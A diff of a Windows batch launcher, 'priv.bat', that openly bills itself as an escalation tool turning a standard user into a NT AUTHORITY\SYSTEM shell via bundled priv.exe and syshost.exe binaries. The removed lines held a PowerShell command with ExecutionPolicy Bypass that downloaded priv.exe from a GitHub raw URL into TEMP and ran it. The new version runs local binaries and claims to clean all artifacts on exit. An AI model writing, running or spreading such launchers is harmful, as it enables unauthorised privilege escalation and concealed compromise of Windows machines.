@@ -2,6 +2,12 @@
 setlocal EnableDelayedExpansion
 title PRIV - Escalation Tool
 
+:: ============================================================
+:: priv.bat - Standalone portable SYSTEM shell
+:: Portable: drop this bat + syshost.exe + priv.exe in same folder and run.
+:: Does NOT install anything. Cleans all artifacts on exit.
+:: ============================================================
+
 cls
 echo.
 echo  +------------------------------------------+
@@ -10,39 +16,38 @@ echo  ^|  Standard User -^> NT AUTHORITY\SYSTEM    ^|
 echo  +------------------------------------------+
 echo.
 echo  Inside the SYSTEM shell you can type:
-echo    power        switch to PowerShell (same window)
-echo    cmdnew       new SYSTEM cmd window
-echo    psnew        new SYSTEM PowerShell window
-echo    unpriv       exit SYSTEM shell and cleanup
+echo    power        - switch to PowerShell (same window)
+echo    cmdnew       - new SYSTEM cmd window
+echo    psnew        - new SYSTEM PowerShell window
+echo    unpriv       - exit SYSTEM shell ^& cleanup
 echo.
-echo  Press any key to begin...
+echo  Press any key to begin escalation...
 pause >nul
 
-:: Use local priv.exe if present, otherwise download to temp
+:: Locate tools relative to this bat file
 set BAT_DIR=%~dp0
 set BAT_DIR=%BAT_DIR:~0,-1%
+
 set PRIV_EXE=%BAT_DIR%\priv.exe
+set SYSHOST_EXE=%BAT_DIR%\syshost.exe
 
 if not exist "%PRIV_EXE%" (
-    echo.
-    echo [*] Downloading priv.exe...
-    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
-        "(New-Object Net.WebClient).DownloadFile(" ^
-        "'https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/priv.exe'," ^
-        "'%TEMP%\priv.exe')"
-    if not exist "%TEMP%\priv.exe" (
-        echo [-] Download failed. Check your internet connection.
-        pause & exit /b 1
-    )
-    set PRIV_EXE=%TEMP%\priv.exe
-    echo [+] Downloaded
+    echo [-] priv.exe not found in %BAT_DIR%
+    echo     Place priv.exe and syshost.exe in the same folder as this bat.
+    pause & exit /b 1
+)
+
+if not exist "%SYSHOST_EXE%" (
+    echo [-] syshost.exe not found in %BAT_DIR%
+    pause & exit /b 1
 )
 
 echo.
-echo [*] Starting escalation...
+echo [*] Starting escalation from: %BAT_DIR%
 echo.
 
+:: Run priv.exe from the bat's directory (so it finds syshost.exe)
+cd /d "%BAT_DIR%"
 "%PRIV_EXE%"
 
 echo.
